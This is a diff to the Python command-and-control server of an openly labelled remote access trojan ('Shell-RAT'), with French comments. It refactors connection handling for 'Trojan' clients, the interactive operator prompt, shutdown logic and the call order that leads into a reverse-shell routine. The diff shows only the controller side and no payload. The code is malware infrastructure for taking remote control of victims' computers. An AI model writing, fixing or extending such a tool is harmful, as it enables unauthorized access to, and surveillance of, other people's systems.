@@ -23,6 +23,7 @@ class Server:
         self.clients_cwd = {}
         # Client selectionner par le server, le client son selectionne via leur indices 
         self.current_client = None
+        
     
     def get_server_socket(self, custom_port=None):
         """
@@ -54,28 +55,29 @@ class Server:
             except OSError as e:
                 print(" ! Server socket fermer ! ".center())
                 break
-            print(" \n\n ")
-            print(tabulate.tabulate(
-                                [
-                                    [  
-                                        "Nouveau client connecté !", 
-                                        f" {client_address[0]}:{client_address[1]}", 
-                                        f"{datetime.now().time()}"
-                                    ]
-                                ],
+            else:
+                print(" \n\n ")
+                print(tabulate.tabulate(
+                                    [
+                                        [  
+                                            "Nouveau client connecté !", 
+                                            f" {client_address[0]}:{client_address[1]}", 
+                                            f"{datetime.now().time()}"
+                                        ]
+                                    ],
 
-                                headers = [
-                                            "Notification", 
-                                            "Détails",
-                                            "Time"
-                                ]
-            ))
-            # Reception du repertoire de travail du client 
-            cwd = client_socket.recv(BUFFER_SIZE).decode()
-            print("[+] Working directory en cours : ", cwd)
-            # Ajout du client au dictionnaire 
-            self.clients[client_address] = client_socket
-            self.clients_cwd[client_address] = cwd
+                                    headers = [
+                                                "Notification", 
+                                                "Détails",
+                                                "Time"
+                                    ]
+                ))
+                # Reception du repertoire de travail du client 
+                cwd = client_socket.recv(BUFFER_SIZE).decode()
+                print("[+] Working directory en cours : ", cwd)
+                # Ajout du client au dictionnaire 
+                self.clients[client_address] = client_socket
+                self.clients_cwd[client_address] = cwd
 
     def accept_connections(self):
         # Accepter les nouveaux clients avec des threads separer (Multithreading)
@@ -86,34 +88,23 @@ class Server:
     
     def close_connections(self):
         # Fermeture de toutes les connexions initialise avec des clients 
-        for _, client_socket in self.clients.items():
-            client_socket.close()
-        self.server_socket.close()
+        if len(self.clients) != 0 : 
+            for _, client_socket in self.clients.items():
+                client_socket.close()
+            self.server_socket.close()
+        else : 
+            print(" Aucun client Trojan en ligne actuellement ! ")
     
     def start_interpreter(self):
         """ Interface de communicatiomn avec le client """
         while True:
             try : 
-                command = input("\n\t [.-Shell-RAT-.]  (*_*) > ") # Invite de commande 
+                command = input("\n\t [.-Shell-RAT-.]  (*_*) > ").strip() # Invite de commande 
             except KeyboardInterrupt as e: 
                 print("\n\n")
                 conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
                 if conf in ["yes",'oui','y','o']:
-                    try : 
-                        self.close_connections()
-                    except Exception as e : # +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[ BUG NON CORRIGER ]
-                        pass 
-                    else : 
-                        print(" Fermeture du server ")
-                        #chargement(message=" Fermeture des socket ... ")
-                        #chargement(message=" Shutdown du server RAT ...")
-            
-            if command.strip().lower() in ['help', 'aide', 'h']:
-                print("""
-                                PAGE EN COURS 
-
-                        """)
-
+                    break
 
             if re.search(r"list\w*", command) or re.search(r"showall\w*", command):
                 # Lister tous les clients actifs 
@@ -142,13 +133,13 @@ class Server:
                         self.start_reverse_shell()
             
             elif command.lower() in ["exit", "quit"]:
-                # exit out of the interpreter if exit|quit are passed
                 break
             elif command == "":
                 # do nothing if command is empty (i.e a new line)
                 pass
             else:
                 print("\t\t >>  [info] : Commande invalide :( ! ", command)
+
         self.close_connections()
 
     def start(self):
@@ -156,8 +147,9 @@ class Server:
             Method responsible for starting the server:
             Accepting client connections and starting the main interpreter
         """
-        self.accept_connections()
         self.start_interpreter()
+        self.accept_connections()
+        
     
     def start_reverse_shell(self):
         # get the current working directory from the current client
